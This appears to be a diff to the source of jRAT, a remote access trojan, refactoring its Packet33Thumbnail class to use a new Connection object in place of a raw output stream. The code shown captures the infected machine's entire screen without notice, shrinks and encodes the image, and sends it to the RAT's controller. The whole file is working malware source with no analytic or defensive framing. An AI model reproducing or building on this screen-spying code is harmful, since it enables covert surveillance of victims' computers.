@@ -1,13 +1,11 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
+import jrat.client.Connection;
 import jrat.common.utils.ImageUtils;
 import jrat.common.utils.Utils;
-import java.awt.Rectangle;
-import java.awt.Robot;
-import java.awt.Toolkit;
+
+import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.DataOutputStream;
 
 public class Packet33Thumbnail extends AbstractOutgoingPacket {
 
@@ -20,15 +18,15 @@ public class Packet33Thumbnail extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		if (!Utils.isHeadless()) {
 			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 			BufferedImage screenShot = new Robot().createScreenCapture(screenRect);
 			screenShot = ImageUtils.resize(screenShot, width, height);
 
 			byte[] buffer = ImageUtils.encode(screenShot, 0.5F);
-			dos.writeInt(buffer.length);
-			dos.write(buffer);
+			con.writeInt(buffer.length);
+			con.write(buffer);
 		}
 	}
 
